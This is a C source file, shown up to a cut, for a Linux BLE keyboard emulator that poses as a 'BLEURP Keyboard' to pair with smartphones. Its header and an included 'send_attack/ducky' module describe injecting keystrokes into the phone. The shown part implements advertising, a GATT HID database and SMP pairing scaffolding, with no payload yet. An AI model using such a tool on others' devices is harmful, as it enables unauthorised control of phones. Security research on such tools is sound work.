// ==============================================================================
//  nom du fichier: peripheral_native.c
//  description courte: Émulateur natif Linux de périphérique BLE Clavier HID
//  (HOGP - HID over GATT Profile) via HCI User Channel.
//  Implémente l'émission d'annonces ADV_IND, la base de données GATT complète,
//  le moteur de négociation SMP (Pairing Response, Security Request) et
//  l'injection de frappes de touches vers le smartphone connecté (iOS / Android).
// ==============================================================================

#define _GNU_SOURCE

#include "peripheral_native.h"
#include "hci_dev.h"
#include "ui.h"
#include "mgmt.h"
#include "send_attack/keymap.h"
#include "send_attack/ducky.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <poll.h>
#include <signal.h>
#include <termios.h>
#include <sys/socket.h>
#include <sys/time.h>

#define AF_BLUETOOTH_VAL     31
#define BTPROTO_HCI_VAL      1
#define HCI_CHANNEL_USER_VAL 1

#define HCI_COMMAND_PKT      0x01
#define HCI_ACLDATA_PKT      0x02
#define HCI_EVENT_PKT        0x04

#define HCI_EV_CMD_COMPLETE    0x0e
#define HCI_EV_CMD_STATUS      0x0f
#define HCI_EV_DISCONN_COMPL   0x05
#define HCI_EV_LE_META         0x3e

#define HCI_LE_EV_CONN_COMPL   0x01
#define HCI_LE_EV_ENHANCED_CONN 0x0a

#define ATT_CID_VAL            0x0004
#define SMP_CID_VAL            0x0006

// ATT Opcodes
#define ATT_OP_ERROR_RSP             0x01
#define ATT_OP_EXCHANGE_MTU_REQ      0x02
#define ATT_OP_EXCHANGE_MTU_RSP      0x03
#define ATT_OP_FIND_INFO_REQ         0x04
#define ATT_OP_FIND_INFO_RSP         0x05
#define ATT_OP_FIND_BY_TYPE_VAL_REQ  0x06
#define ATT_OP_FIND_BY_TYPE_VAL_RSP  0x07
#define ATT_OP_READ_BY_TYPE_REQ      0x08
#define ATT_OP_READ_BY_TYPE_RSP      0x09
#define ATT_OP_READ_REQ              0x0a
#define ATT_OP_READ_RSP              0x0b
#define ATT_OP_READ_BLOB_REQ         0x0c
#define ATT_OP_READ_BLOB_RSP         0x0d
#define ATT_OP_READ_BY_GRP_TYPE_REQ  0x10
#define ATT_OP_READ_BY_GRP_TYPE_RSP  0x11
#define ATT_OP_WRITE_REQ             0x12
#define ATT_OP_WRITE_RSP             0x13
#define ATT_OP_WRITE_CMD             0x52
#define ATT_OP_HANDLE_VAL_NTF        0x1b

// ATT Error codes
#define ATT_ERR_INVALID_HANDLE       0x01
#define ATT_ERR_READ_NOT_PERMITTED   0x02
#define ATT_ERR_WRITE_NOT_PERMITTED  0x03
#define ATT_ERR_INVALID_PDU          0x04
#define ATT_ERR_INSUFFICIENT_AUTHEN  0x05
#define ATT_ERR_REQ_NOT_SUPPORTED    0x06
#define ATT_ERR_INVALID_OFFSET       0x07
#define ATT_ERR_ATTR_NOT_FOUND       0x0a

// SMP Opcodes
#define SMP_OP_PAIRING_REQ           0x01
#define SMP_OP_PAIRING_RSP           0x02
#define SMP_OP_PAIRING_CONFIRM       0x03
#define SMP_OP_PAIRING_RANDOM        0x04
#define SMP_OP_PAIRING_FAILED        0x05
#define SMP_OP_SECURITY_REQ          0x0b
#define SMP_OP_PUBLIC_KEY            0x0c
#define SMP_OP_DHKEY_CHECK           0x0d

// Handles GATT fixes de notre clavier HID
#define GATT_HANDLE_GAP_SVC          0x0001
#define GATT_HANDLE_NAME_DECL        0x0002
#define GATT_HANDLE_NAME_VAL         0x0003
#define GATT_HANDLE_APPEAR_DECL      0x0004
#define GATT_HANDLE_APPEAR_VAL       0x0005

#define GATT_HANDLE_DIS_SVC          0x0006
#define GATT_HANDLE_MANUF_DECL       0x0007
#define GATT_HANDLE_MANUF_VAL        0x0008
#define GATT_HANDLE_MODEL_DECL       0x0009
#define GATT_HANDLE_MODEL_VAL        0x000a

#define GATT_HANDLE_BATT_SVC         0x000b
#define GATT_HANDLE_BATT_DECL        0x000c
#define GATT_HANDLE_BATT_VAL         0x000d
#define GATT_HANDLE_BATT_CCCD        0x000e

#define GATT_HANDLE_HID_SVC          0x0010
#define GATT_HANDLE_HID_INFO_DECL    0x0011
#define GATT_HANDLE_HID_INFO_VAL     0x0012
#define GATT_HANDLE_REPORT_MAP_DECL  0x0013
#define GATT_HANDLE_REPORT_MAP_VAL   0x0014
#define GATT_HANDLE_PROTO_MODE_DECL  0x0015
#define GATT_HANDLE_PROTO_MODE_VAL   0x0016
#define GATT_HANDLE_INPUT_REP_DECL   0x0017
#define GATT_HANDLE_INPUT_REP_VAL    0x0018
#define GATT_HANDLE_INPUT_REP_CCCD   0x0019
#define GATT_HANDLE_INPUT_REP_REF    0x001a
#define GATT_HANDLE_OUTPUT_REP_DECL  0x001b
#define GATT_HANDLE_OUTPUT_REP_VAL   0x001c
#define GATT_HANDLE_OUTPUT_REP_REF   0x001d
#define GATT_HANDLE_CTRL_POINT_DECL  0x001e
#define GATT_HANDLE_CTRL_POINT_VAL   0x001f

#define GATT_MAX_HANDLE              0x0020

// Descripteur standard de rapport Clavier HID (Report Map de 63 octets)
static const uint8_t hid_keyboard_report_map[] = {
    0x05, 0x01,       // Usage Page (Generic Desktop)
    0x09, 0x06,       // Usage (Keyboard)
    0xA1, 0x01,       // Collection (Application)
    0x05, 0x07,       //   Usage Page (Key Codes)
    0x19, 0xE0,       //   Usage Minimum (224)
    0x29, 0xE7,       //   Usage Maximum (231)
    0x15, 0x00,       //   Logical Minimum (0)
    0x25, 0x01,       //   Logical Maximum (1)
    0x75, 0x01,       //   Report Size (1)
    0x95, 0x08,       //   Report Count (8)
    0x81, 0x02,       //   Input (Data, Variable, Absolute) -- Modifiers byte
    0x95, 0x01,       //   Report Count (1)
    0x75, 0x08,       //   Report Size (8)
    0x81, 0x01,       //   Input (Constant) -- Reserved byte
    0x95, 0x05,       //   Report Count (5)
    0x75, 0x01,       //   Report Size (1)
    0x05, 0x08,       //   Usage Page (LEDs)
    0x19, 0x01,       //   Usage Minimum (1)
    0x29, 0x05,       //   Usage Maximum (5)
    0x91, 0x02,       //   Output (Data, Variable, Absolute) -- LED report
    0x95, 0x01,       //   Report Count (1)
    0x75, 0x03,       //   Report Size (3)
    0x91, 0x01,       //   Output (Constant) -- LED padding
    0x95, 0x06,       //   Report Count (6)
    0x75, 0x08,       //   Report Size (8)
    0x15, 0x00,       //   Logical Minimum (0)
    0x25, 0x65,       //   Logical Maximum (101)
    0x05, 0x07,       //   Usage Page (Key Codes)
    0x19, 0x00,       //   Usage Minimum (0)
    0x29, 0x65,       //   Usage Maximum (101)
    0x81, 0x00,       //   Input (Data, Array) -- Key array (6 bytes)
    0xC0              // End Collection
};

struct sockaddr_hci_raw {
    uint16_t hci_family;
    uint16_t hci_dev;
    uint16_t hci_channel;
};

// Arrêt/Démarrage de l'adaptateur via BlueZ mgmt pour acquérir HCI_CHANNEL_USER
static void set_adapter_power_mgmt(int dev_id, uint8_t powered) {
    int mfd = mgmt_open();
    if (mfd < 0) return;
    uint8_t cmd[16];
    ssize_t n = mgmt_build_command(cmd, sizeof(cmd), MGMT_OP_SET_POWERED, (uint16_t)dev_id, &powered, 1);
    if (n > 0) {
        if (write(mfd, cmd, (size_t)n) > 0) {
            uint8_t rsp[64];
            (void)read(mfd, rsp, sizeof(rsp));
        }
    }
    mgmt_close(mfd);
}

// Envoi d'une commande HCI synchrone et vérification du statut contrôleur
static int hci_send_cmd_sync(int fd, uint16_t opcode, const uint8_t *param, uint8_t plen, uint8_t *out_status) {
    uint8_t buf[256];
    buf[0] = HCI_COMMAND_PKT;
    buf[1] = (uint8_t)(opcode & 0xff);
    buf[2] = (uint8_t)(opcode >> 8);
    buf[3] = plen;
    if (plen && param) {
        memcpy(&buf[4], param, plen);
    }
    ssize_t total = 4 + plen;
    if (write(fd, buf, (size_t)total) != total) {
        return -1;
    }

    struct pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
    for (int i = 0; i < 20; i++) {
        if (poll(&pfd, 1, 100) <= 0) break;
        uint8_t rsp[256];
        ssize_t n = read(fd, rsp, sizeof(rsp));
        if (n < 3) continue;
        if (rsp[0] == HCI_EVENT_PKT) {
            if (rsp[1] == HCI_EV_CMD_COMPLETE && n >= 6) {
                uint16_t op = (uint16_t)(rsp[4] | (rsp[5] << 8));
                if (op == opcode) {
                    if (out_status && n >= 7) *out_status = rsp[6];
                    return (n >= 7 && rsp[6] == 0x00) ? 0 : -1;
                }
            } else if (rsp[1] == HCI_EV_CMD_STATUS && n >= 7) {
                uint16_t op = (uint16_t)(rsp[5] | (rsp[6] << 8));
                if (op == opcode) {
                    if (out_status) *out_status = rsp[3];
                    return (rsp[3] == 0x00) ? 0 : -1;
                }
            }
        }
    }
    return 0;
}

// Envoi d'une commande HCI brute
static int hci_send_cmd(int fd, uint16_t opcode, const uint8_t *param, uint8_t plen) {
    return hci_send_cmd_sync(fd, opcode, param, plen, NULL);
}

// Envoi d'un paquet ACL contenant un payload L2CAP sur le CID spécifié
static int send_l2cap_packet(int fd, uint16_t conn_handle, uint16_t cid, const uint8_t *payload, uint16_t len) {
    uint8_t pkt[512];
    uint16_t l2cap_len = len;
    uint16_t acl_len = (uint16_t)(4 + l2cap_len);

    pkt[0] = HCI_ACLDATA_PKT;
    pkt[1] = (uint8_t)(conn_handle & 0xff);
    pkt[2] = (uint8_t)((conn_handle >> 8) & 0x0f); // PB = 00b, BC = 00b
    pkt[3] = (uint8_t)(acl_len & 0xff);
    pkt[4] = (uint8_t)(acl_len >> 8);

    pkt[5] = (uint8_t)(l2cap_len & 0xff);
    pkt[6] = (uint8_t)(l2cap_len >> 8);
    pkt[7] = (uint8_t)(cid & 0xff);
    pkt[8] = (uint8_t)(cid >> 8);

    memcpy(&pkt[9], payload, len);
    ssize_t total = 9 + len;
    return (write(fd, pkt, (size_t)total) == total) ? 0 : -1;
}

// Construction du paquet d'annonces BLE (ADV_IND)
int peripheral_build_adv_data(const char *name, uint8_t *out_buf, size_t max_len) {
    if (!out_buf || max_len < 31) return -1;
    if (!name) name = "BLEURP Keyboard";

    size_t name_len = strlen(name);
    if (name_len > 18) name_len = 18;

    size_t off = 0;

    // 1. Flags (3 octets)
    out_buf[off++] = 0x02; // Longueur
    out_buf[off++] = 0x01; // AD Type: Flags
    out_buf[off++] = 0x06; // LE General Discoverable Mode, BR/EDR Not Supported

    // 2. 16-bit Service UUIDs (0x1812 HID)
    out_buf[off++] = 0x03; // Longueur
    out_buf[off++] = 0x03; // AD Type: Complete List of 16-bit Service UUIDs
    out_buf[off++] = 0x12; // UUID 0x1812 (LSB)
    out_buf[off++] = 0x18; // UUID 0x1812 (MSB)

    // 3. Appearance (0x03C1 Keyboard)
    out_buf[off++] = 0x03; // Longueur
    out_buf[off++] = 0x19; // AD Type: Appearance
    out_buf[off++] = 0xC1; // 0x03C1 (LSB)
    out_buf[off++] = 0x03; // 0x03C1 (MSB)

    // 4. Complete Local Name
    if (off + 2 + name_len <= 31) {
        out_buf[off++] = (uint8_t)(name_len + 1);
        out_buf[off++] = 0x09; // AD Type: Complete Local Name
        memcpy(&out_buf[off], name, name_len);
        off += name_len;
    }

    return (int)off;
}

// Construction de la réponse au scan (Scan Response Data)
// Construction de la réponse au scan (Scan Response Data)
int peripheral_build_scan_rsp(const char *name, uint8_t *out_buf, size_t max_len) {
    if (!out_buf || max_len < 31) return -1;
    if (!name) name = "BLEURP Keyboard";

    size_t name_len = strlen(name);
    if (name_len > 18) name_len = 18;

    size_t off = 0;

    // 1. Complete Local Name
    out_buf[off++] = (uint8_t)(name_len + 1);
    out_buf[off++] = 0x09; // AD Type: Complete Local Name
    memcpy(&out_buf[off], name, name_len);
    off += name_len;

    // 2. Services UUIDs (0x1812 HID)
    if (off + 4 <= 31) {
        out_buf[off++] = 0x03; // Longueur
        out_buf[off++] = 0x03; // 16-bit Service UUIDs
        out_buf[off++] = 0x12;
        out_buf[off++] = 0x18; // 0x1812 HID
    }

    // 3. Appearance (0x03C1 Keyboard)
    if (off + 4 <= 31) {
        out_buf[off++] = 0x03;
        out_buf[off++] = 0x19; // AD Type: Appearance
        out_buf[off++] = 0xC1;
        out_buf[off++] = 0x03;
    }

    return (int)off;
}

// Formatage d'une réponse d'erreur ATT
static int build_att_error(uint8_t req_op, uint16_t handle, uint8_t err_code, uint8_t *rsp, size_t rsp_max) {
    if (rsp_max < 5) return -1;
    rsp[0] = ATT_OP_ERROR_RSP;
    rsp[1] = req_op;
    rsp[2] = (uint8_t)(handle & 0xff);
    rsp[3] = (uint8_t)(handle >> 8);
    rsp[4] = err_code;
    return 5;
}

// Moteur de base de données GATT (HOGP HID Keyboard)
int gatt_server_handle_att_packet(uint16_t conn_handle,
                                 const uint8_t *req, size_t req_len,
                                 uint8_t *rsp, size_t rsp_max,
                                 const char *dev_name,
                                 bool *out_notifications_enabled) {
    (void)conn_handle;
    if (!req || req_len < 1 || !rsp || rsp_max < 16) return -1;
    if (!dev_name) dev_name = "BLEURP Keyboard";

    uint8_t op = req[0];

    // 1. Exchange MTU Request
    if (op == ATT_OP_EXCHANGE_MTU_REQ) {
        if (req_len < 3) return build_att_error(op, 0x0000, ATT_ERR_INVALID_PDU, rsp, rsp_max);
        rsp[0] = ATT_OP_EXCHANGE_MTU_RSP;
        rsp[1] = 0xF7; // MTU = 247
        rsp[2] = 0x00;
        return 3;
    }

    // 2. Read By Group Type Request (Découverte des Services Primaires 0x2800)
    if (op == ATT_OP_READ_BY_GRP_TYPE_REQ) {
        if (req_len < 7) return build_att_error(op, 0x0000, ATT_ERR_INVALID_PDU, rsp, rsp_max);
        uint16_t start = (uint16_t)(req[1] | (req[2] << 8));
        uint16_t end   = (uint16_t)(req[3] | (req[4] << 8));
        uint16_t uuid  = (uint16_t)(req[5] | (req[6] << 8));

        if (uuid != 0x2800) {
            return build_att_error(op, start, ATT_ERR_ATTR_NOT_FOUND, rsp, rsp_max);
        }

        // Services définis :
        // 1. 0x0001 - 0x0005 : Generic Access (0x1800)
        // 2. 0x0006 - 0x000a : Device Information (0x180A)
        // 3. 0x000b - 0x000e : Battery Service (0x180F)
        // 4. 0x0010 - 0x0020 : Human Interface Device (0x1812)
        struct { uint16_t s; uint16_t e; uint16_t u; } svcs[] = {
            { 0x0001, 0x0005, 0x1800 },
            { 0x0006, 0x000a, 0x180A },
            { 0x000b, 0x000e, 0x180F },
            { 0x0010, 0x0020, 0x1812 }
        };

        size_t off = 2;
        rsp[0] = ATT_OP_READ_BY_GRP_TYPE_RSP;
        rsp[1] = 6; // Taille de chaque entrée (Start 2 + End 2 + UUID 2 = 6)

        int matched = 0;
        for (size_t i = 0; i < sizeof(svcs)/sizeof(svcs[0]); i++) {
            if (svcs[i].s >= start && svcs[i].s <= end) {
                if (off + 6 > rsp_max) break;
                rsp[off++] = (uint8_t)(svcs[i].s & 0xff);
                rsp[off++] = (uint8_t)(svcs[i].s >> 8);
                rsp[off++] = (uint8_t)(svcs[i].e & 0xff);
                rsp[off++] = (uint8_t)(svcs[i].e >> 8);
                rsp[off++] = (uint8_t)(svcs[i].u & 0xff);
                rsp[off++] = (uint8_t)(svcs[i].u >> 8);
                matched++;
            }
        }

        if (matched == 0) {
            return build_att_error(op, start, ATT_ERR_ATTR_NOT_FOUND, rsp, rsp_max);
        }
        return (int)off;
    }

    // 3. Find By Type Value Request (Recherche d'un service spécifique)
    if (op == ATT_OP_FIND_BY_TYPE_VAL_REQ) {
        if (req_len < 7) return build_att_error(op, 0x0000, ATT_ERR_INVALID_PDU, rsp, rsp_max);
        uint16_t start = (uint16_t)(req[1] | (req[2] << 8));
        uint16_t end   = (uint16_t)(req[3] | (req[4] << 8));
        uint16_t type  = (uint16_t)(req[5] | (req[6] << 8));
        uint16_t val   = (req_len >= 9) ? (uint16_t)(req[7] | (req[8] << 8)) : 0;

        if (type == 0x2800) {
            uint16_t s = 0, e = 0;
            if (val == 0x1800) { s = 0x0001; e = 0x0005; }
            else if (val == 0x180A) { s = 0x0006; e = 0x000a; }
            else if (val == 0x180F) { s = 0x000b; e = 0x000e; }
            else if (val == 0x1812) { s = 0x0010; e = 0x0020; }

            if (s && s >= start && s <= end) {
                rsp[0] = ATT_OP_FIND_BY_TYPE_VAL_RSP;
                rsp[1] = (uint8_t)(s & 0xff); rsp[2] = (uint8_t)(s >> 8);
                rsp[3] = (uint8_t)(e & 0xff); rsp[4] = (uint8_t)(e >> 8);
                return 5;
            }
        }
        return build_att_error(op, start, ATT_ERR_ATTR_NOT_FOUND, rsp, rsp_max);
    }

    // 4. Read By Type Request (Découverte des Caractéristiques 0x2803 ou lecture de nom/apparence)
    if (op == ATT_OP_READ_BY_TYPE_REQ) {
        if (req_len < 7) return build_att_error(op, 0x0000, ATT_ERR_INVALID_PDU, rsp, rsp_max);
        uint16_t start = (uint16_t)(req[1] | (req[2] << 8));
        uint16_t end   = (uint16_t)(req[3] | (req[4] << 8));
        uint16_t type  = (uint16_t)(req[5] | (req[6] << 8));

        // Caractéristiques déclarées (0x2803)
        if (type == 0x2803) {
            struct { uint16_t decl_h; uint8_t prop; uint16_t val_h; uint16_t uuid; } chars[] = {
                { GATT_HANDLE_NAME_DECL,       0x02, GATT_HANDLE_NAME_VAL,       0x2A00 }, // Device Name (Read)
                { GATT_HANDLE_APPEAR_DECL,     0x02, GATT_HANDLE_APPEAR_VAL,     0x2A01 }, // Appearance (Read)
                { GATT_HANDLE_MANUF_DECL,      0x02, GATT_HANDLE_MANUF_VAL,      0x2A29 }, // Manufacturer (Read)
                { GATT_HANDLE_MODEL_DECL,      0x02, GATT_HANDLE_MODEL_VAL,      0x2A24 }, // Model Number (Read)
                { GATT_HANDLE_BATT_DECL,       0x12, GATT_HANDLE_BATT_VAL,       0x2A19 }, // Batt Level (Read|Notify)
                { GATT_HANDLE_HID_INFO_DECL,   0x02, GATT_HANDLE_HID_INFO_VAL,   0x2A4A }, // HID Info (Read)
                { GATT_HANDLE_REPORT_MAP_DECL, 0x02, GATT_HANDLE_REPORT_MAP_VAL, 0x2A4B }, // Report Map (Read)
                { GATT_HANDLE_PROTO_MODE_DECL, 0x06, GATT_HANDLE_PROTO_MODE_VAL, 0x2A4E }, // Protocol Mode (Read|WriteNoRsp)
                { GATT_HANDLE_INPUT_REP_DECL,  0x12, GATT_HANDLE_INPUT_REP_VAL,  0x2A4D }, // Input Report (Read|Notify)
                { GATT_HANDLE_OUTPUT_REP_DECL, 0x0e, GATT_HANDLE_OUTPUT_REP_VAL, 0x2A4D }, // Output Report (Read|Write|WriteNoRsp)
                { GATT_HANDLE_CTRL_POINT_DECL, 0x04, GATT_HANDLE_CTRL_POINT_VAL, 0x2A4C }, // Control Point (WriteNoRsp)
            };

            size_t off = 2;
            rsp[0] = ATT_OP_READ_BY_TYPE_RSP;
            rsp[1] = 7; // Handle(2) + Prop(1) + ValHandle(2) + UUID(2) = 7

            int count = 0;
            for (size_t i = 0; i < sizeof(chars)/sizeof(chars[0]); i++) {
                if (chars[i].decl_h >= start && chars[i].decl_h <= end) {
                    if (off + 7 > rsp_max) break;
                    rsp[off++] = (uint8_t)(chars[i].decl_h & 0xff);
                    rsp[off++] = (uint8_t)(chars[i].decl_h >> 8);
                    rsp[off++] = chars[i].prop;
                    rsp[off++] = (uint8_t)(chars[i].val_h & 0xff);
                    rsp[off++] = (uint8_t)(chars[i].val_h >> 8);
                    rsp[off++] = (uint8_t)(chars[i].uuid & 0xff);
                    rsp[off++] = (uint8_t)(chars[i].uuid >> 8);
                    count++;
                }
            }

            if (count == 0) {
                return build_att_error(op, start, ATT_ERR_ATTR_NOT_FOUND, rsp, rsp_max);
            }
            return (int)off;
        }

        // Lecture de valeur par UUID (ex: 0x2A00 Device Name)
        if (type == 0x2A00 && start <= GATT_HANDLE_NAME_VAL && end >= GATT_HANDLE_NAME_VAL) {
            size_t nlen = strlen(dev_name);
            rsp[0] = ATT_OP_READ_BY_TYPE_RSP;
            rsp[1] = (uint8_t)(2 + nlen);
            rsp[2] = (uint8_t)(GATT_HANDLE_NAME_VAL & 0xff);
            rsp[3] = (uint8_t)(GATT_HANDLE_NAME_VAL >> 8);
            memcpy(&rsp[4], dev_name, nlen);
            return (int)(4 + nlen);
        }

        // Lecture de l'Appearance (0x2A01)
        if (type == 0x2A01 && start <= GATT_HANDLE_APPEAR_VAL && end >= GATT_HANDLE_APPEAR_VAL) {
            rsp[0] = ATT_OP_READ_BY_TYPE_RSP;
            rsp[1] = 4;
            rsp[2] = (uint8_t)(GATT_HANDLE_APPEAR_VAL & 0xff);
            rsp[3] = (uint8_t)(GATT_HANDLE_APPEAR_VAL >> 8);
            rsp[4] = 0xC1; rsp[5] = 0x03; // Keyboard 0x03C1
            return 6;
        }

        return build_att_error(op, start, ATT_ERR_ATTR_NOT_FOUND, rsp, rsp_max);
    }

    // 5. Find Information Request (Découverte des descripteurs CCCD, Report Reference)
    if (op == ATT_OP_FIND_INFO_REQ) {
        if (req_len < 5) return build_att_error(op, 0x0000, ATT_ERR_INVALID_PDU, rsp, rsp_max);
        uint16_t start = (uint16_t)(req[1] | (req[2] << 8));
        uint16_t end   = (uint16_t)(req[3] | (req[4] << 8));

        struct { uint16_t h; uint16_t uuid; } descs[] = {
            { GATT_HANDLE_BATT_CCCD,      0x2902 },
            { GATT_HANDLE_INPUT_REP_CCCD, 0x2902 },
            { GATT_HANDLE_INPUT_REP_REF,  0x2908 },
            { GATT_HANDLE_OUTPUT_REP_REF, 0x2908 },
        };

        size_t off = 2;
        rsp[0] = ATT_OP_FIND_INFO_RSP;
        rsp[1] = 0x01; // Format 1: 16-bit UUIDs (Handle 2 + UUID 2 = 4 octets)

        int count = 0;
        for (size_t i = 0; i < sizeof(descs)/sizeof(descs[0]); i++) {
            if (descs[i].h >= start && descs[i].h <= end) {
                if (off + 4 > rsp_max) break;
                rsp[off++] = (uint8_t)(descs[i].h & 0xff);
                rsp[off++] = (uint8_t)(descs[i].h >> 8);
                rsp[off++] = (uint8_t)(descs[i].uuid & 0xff);
                rsp[off++] = (uint8_t)(descs[i].uuid >> 8);
                count++;
            }
        }

        if (count == 0) {
            return build_att_error(op, start, ATT_ERR_ATTR_NOT_FOUND, rsp, rsp_max);
        }
        return (int)off;
    }

    // 6. Read Request (Lecture d'une valeur d'attribut par Handle)
    if (op == ATT_OP_READ_REQ) {
        if (req_len < 3) return build_att_error(op, 0x0000, ATT_ERR_INVALID_PDU, rsp, rsp_max);
        uint16_t h = (uint16_t)(req[1] | (req[2] << 8));

        rsp[0] = ATT_OP_READ_RSP;
        size_t vlen = 0;

        switch (h) {
            case GATT_HANDLE_NAME_VAL: {
                size_t nlen = strlen(dev_name);
                memcpy(&rsp[1], dev_name, nlen);
                vlen = nlen;
                break;
            }
            case GATT_HANDLE_APPEAR_VAL:
                rsp[1] = 0xC1; rsp[2] = 0x03; // Keyboard (0x03C1)
                vlen = 2;
                break;
            case GATT_HANDLE_MANUF_VAL: {
                const char *man = "EPITECH Marseille";
                size_t mlen = strlen(man);
                memcpy(&rsp[1], man, mlen);
                vlen = mlen;
                break;
            }
            case GATT_HANDLE_MODEL_VAL: {
                const char *mod = "BLEURP-KB-v1";
                size_t mlen = strlen(mod);
                memcpy(&rsp[1], mod, mlen);
                vlen = mlen;
                break;
            }
            case GATT_HANDLE_BATT_VAL:
                rsp[1] = 0x64; // 100%
                vlen = 1;
                break;
            case GATT_HANDLE_BATT_CCCD:
            case GATT_HANDLE_INPUT_REP_CCCD:
                rsp[1] = 0x00; rsp[2] = 0x00;
                vlen = 2;
                break;
            case GATT_HANDLE_HID_INFO_VAL:
                rsp[1] = 0x01; rsp[2] = 0x01; // bcdHID = 1.1
                rsp[3] = 0x00;                 // bCountryCode = 0
                rsp[4] = 0x02;                 // Flags: Normally Connectable
                vlen = 4;
                break;
            case GATT_HANDLE_REPORT_MAP_VAL:
                vlen = sizeof(hid_keyboard_report_map);
                if (vlen > rsp_max - 1) vlen = rsp_max - 1;
                memcpy(&rsp[1], hid_keyboard_report_map, vlen);
                break;
            case GATT_HANDLE_PROTO_MODE_VAL:
                rsp[1] = 0x01; // Report Protocol Mode
                vlen = 1;
                break;
            case GATT_HANDLE_INPUT_REP_VAL:
                memset(&rsp[1], 0, 8); // 8 octets de zéros
                vlen = 8;
                break;
            case GATT_HANDLE_INPUT_REP_REF:
                rsp[1] = 0x00; // Report ID 0 (Standard unnumbered report)
                rsp[2] = 0x01; // Report Type 1 (Input)
                vlen = 2;
                break;
            case GATT_HANDLE_OUTPUT_REP_VAL:
                rsp[1] = 0x00; // LEDs
                vlen = 1;
                break;
            case GATT_HANDLE_OUTPUT_REP_REF:
                rsp[1] = 0x00; // Report ID 0
                rsp[2] = 0x02; // Report Type 2 (Output)
                vlen = 2;
                break;
            case GATT_HANDLE_CTRL_POINT_VAL:
                rsp[1] = 0x00;
                vlen = 1;
                break;
            default:
                return build_att_error(op, h, ATT_ERR_INVALID_HANDLE, rsp, rsp_max);
        }
        return (int)(1 + vlen);
    }

    // 7. Read Blob Request (Lecture d'une valeur longue avec offset, ex: Report Map)
    if (op == ATT_OP_READ_BLOB_REQ) {
        if (req_len < 5) return build_att_error(op, 0x0000, ATT_ERR_INVALID_PDU, rsp, rsp_max);
        uint16_t h   = (uint16_t)(req[1] | (req[2] << 8));
        uint16_t off = (uint16_t)(req[3] | (req[4] << 8));

        if (h == GATT_HANDLE_REPORT_MAP_VAL) {
            size_t total = sizeof(hid_keyboard_report_map);
            if (off >= total) {
                return build_att_error(op, h, ATT_ERR_INVALID_OFFSET, rsp, rsp_max);
            }
            size_t remaining = total - off;
            if (remaining > rsp_max - 1) remaining = rsp_max - 1;

            rsp[0] = ATT_OP_READ_BLOB_RSP;
            memcpy(&rsp[1], &hid_keyboard_report_map[off], remaining);
            return (int)(1 + remaining);
        }

        return build_att_error(op, h, ATT_ERR_REQ_NOT_SUPPORTED, rsp, rsp_max);
    }

    // 8. Write Request (Écriture avec accusé, ex: activation des notifications sur CCCD)
    if (op == ATT_OP_WRITE_REQ) {
        if (req_len < 3) return build_att_error(op, 0x0000, ATT_ERR_INVALID_PDU, rsp, rsp_max);
        uint16_t h = (uint16_t)(req[1] | (req[2] << 8));

        if (h == GATT_HANDLE_INPUT_REP_CCCD) {
            if (req_len >= 5) {
                uint16_t cccd = (uint16_t)(req[3] | (req[4] << 8));
                if (out_notifications_enabled) {
                    *out_notifications_enabled = (cccd & 0x0001) != 0;
                }
            }
        }
        rsp[0] = ATT_OP_WRITE_RSP;
        return 1;
    }

    // 9. Write Command (Écriture sans accusé de réception)
    if (op == ATT_OP_WRITE_CMD) {
        if (req_len >= 3) {
            uint16_t h = (uint16_t)(req[1] | (req[2] << 8));
            if (h == GATT_HANDLE_INPUT_REP_CCCD && req_len >= 5) {
                uint16_t cccd = (uint16_t)(req[3] | (req[4] << 8));
                if (out_notifications_enabled) {
                    *out_notifications_enabled = (cccd & 0x0001) != 0;
                }
            }
        }
        return 0; // Pas de réponse
    }

    return build_att_error(op, 0x0001, ATT_ERR_REQ_NOT_SUPPORTED, rsp, rsp_max);
}

// Lecture de l'adresse MAC réelle (BD_ADDR) du contrôleur local
static int hci_read_local_bdaddr(int fd, uint8_t out_bdaddr[6]) {
    uint8_t cmd[4];
    cmd[0] = HCI_COMMAND_PKT;
    cmd[1] = 0x09; // HCI_Read_BD_ADDR opcode 0x1009
    cmd[2] = 0x10;
    cmd[3] = 0x00; // param len 0
    if (write(fd, cmd, 4) != 4) return -1;

    struct pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
    for (int i = 0; i < 20; i++) {
        if (poll(&pfd, 1, 100) <= 0) break;
        uint8_t rsp[256];
        ssize_t n = read(fd, rsp, sizeof(rsp));
        if (n < 7) continue;
        if (rsp[0] == HCI_EVENT_PKT && rsp[1] == HCI_EV_CMD_COMPLETE) {
            uint16_t op = (uint16_t)(rsp[4] | (rsp[5] << 8));
            if (op == 0x1009 && rsp[6] == 0x00 && n >= 13) {
                if (out_bdaddr) {
                    memcpy(out_bdaddr, &rsp[7], 6);
                }
                return 0;
            }
        }
    }
    return -1;
}

// Session SMP pour le calcul cryptographique (Legacy Just Works)
struct smp_session_state {
    uint8_t preq[7];
    uint8_t pres[7];
    uint8_t iat;
    uint8_t rat;
    uint8_t ia[6];
    uint8_t ra[6];
    uint8_t tk[16];
    uint8_t r1[16];
    uint8_t r2[16];
    uint8_t c1[16];
    uint8_t c2[16];
    uint8_t stk[16];
    uint8_t ltk[16];         // LTK à distribuer en Phase 3 (Responder → Initiator)
    uint16_t ediv;           // EDIV associé au LTK (0 pour STK-derived)
    uint8_t rand_val[8];     // Rand associé au LTK
    uint8_t negotiated_keysize;
    uint8_t resp_key_dist;   // Clés que le Responder s'engage à distribuer
    bool stk_ready;
    bool encrypted;          // Lien chiffré (après HCI_EV_ENCRYPT_CHANGE)
    bool phase3_pending;     // Distribution de clés Phase 3 en attente d'envoi
    bool active;
};

static struct smp_session_state g_smp_session;
static uint8_t g_local_bdaddr[6];

static const char *smp_fail_reason_str(uint8_t reason) {
    switch (reason) {
        case 0x01: return "Passkey Entry Failed";
        case 0x02: return "OOB Not Available";
        case 0x03: return "Authentication Requirements (MITM/SC mismatch)";
        case 0x04: return "Confirm Value Failed (Hash mismatch / Invalid Key)";
        case 0x05: return "Pairing Not Supported";
        case 0x06: return "Encryption Key Size Inadequate";
        case 0x07: return "Command Not Supported";
        case 0x08: return "Unspecified Reason";
        case 0x09: return "Repeated Attempts";
        case 0x0a: return "Invalid Parameters";
        case 0x0b: return "DHKey Check Failed";
        case 0x0c: return "Numeric Comparison Failed";
        case 0x0d: return "BR/EDR Pairing In Progress";
        case 0x0e: return "Cross-Transport Key Derivation Not Allowed";
        default:   return "Code Inconnu";
    }
}

static const uint8_t sbox[256] = {
